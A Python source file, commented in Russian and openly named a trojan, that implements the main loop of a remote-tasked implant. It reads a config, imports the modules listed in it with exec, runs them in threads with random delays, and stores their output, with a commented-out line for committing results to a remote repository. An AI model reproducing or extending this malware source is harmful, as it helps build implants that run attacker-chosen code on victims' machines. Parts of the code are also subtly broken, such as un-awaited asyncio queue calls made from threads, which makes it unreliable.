# -*- coding: utf-8 -*-
import json
import base64
import sys
import time
import imp
import random
import threading
import asyncio
import os
 
trojan_id = "abc" #id. пока вручную. потом вынести в конфиги и создавать автоматически

trojan_config = "config/%s.json" % trojan_id
data_path     = "data/%s/" % trojan_id
trojan_modules= []

task_queue    = asyncio.Queue()
configured    = False

def get_trojan_config():
    global configured
    with open(trojan_config, 'r', encoding='utf-8') as fh: #открываем файл на чтение
        config = json.load(fh)
        configured    = True
        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])
    return config

def store_module_result(module, data):
    moduleDir = ".//data//%s" % module
    os.makedirs(moduleDir, exist_ok=True)
    #remote_path = ".//data//%s//%d.data" % (trojan_id,random.randint(1000,100000))
    remote_path = ".//data//%s//%d.txt" % (module , random.randint(1000,100000))
    f = open(remote_path, 'w')
    f.write(data)
    #repo.create_file(remote_path,"Commit message",base64.b64encode(data))
    return

def module_runner(module):
    task_queue.put(1)
    print("[+]start " + module)
    result = sys.modules[module].run()
    task_queue.get()
    store_module_result(module, result)
    print("[-]stop " + module)
    return
#один запуск
#постоянная работа
#периодический
    
# main trojan loop

while True:
    if task_queue.empty(): #если очередь пуста
        config = get_trojan_config()

        for task in config:
            t = threading.Thread(target=module_runner,args=(task['module'],))
            t.start()
            time.sleep(random.randint(1,10))
    sleepOnSec = random.randint(10,100)
    print("спать на " + str(sleepOnSec))
    time.sleep(sleepOnSec)